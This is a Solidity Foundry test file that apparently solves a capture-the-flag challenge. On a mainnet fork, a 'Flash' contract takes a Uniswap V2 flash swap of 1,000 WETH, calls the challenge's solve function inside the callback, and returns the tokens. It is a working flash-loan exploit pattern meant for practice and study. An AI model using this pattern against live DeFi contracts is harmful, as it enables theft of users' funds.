// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";
import './IUniswapV2Callee.sol';
import './IUniswapV2Pair.sol';
contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {

        vm.createSelectFork("mainnet", 17600000);

        playerAddress = makeAddr("player");
        vm.deal(playerAddress, 4 ether);
        setup = new Setup();
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Flash(setup).attack();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Flash is IUniswapV2Callee {
    Setup setup;
    address pair=0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function attack() public{
        setup.weth().approve(pair,1 ether);
        IUniswapV2Pair(pair).swap(0, 1_000 ether, address(this), "");
    }
    function uniswapV2Call(
        address ,
        uint ,
        uint,
        bytes calldata
    ) external override{
        setup.flag().solve();
        setup.weth().transfer(pair, 1_000 ether);
    }
    receive() external payable {}
}
////////// YOUR CODE END //////////
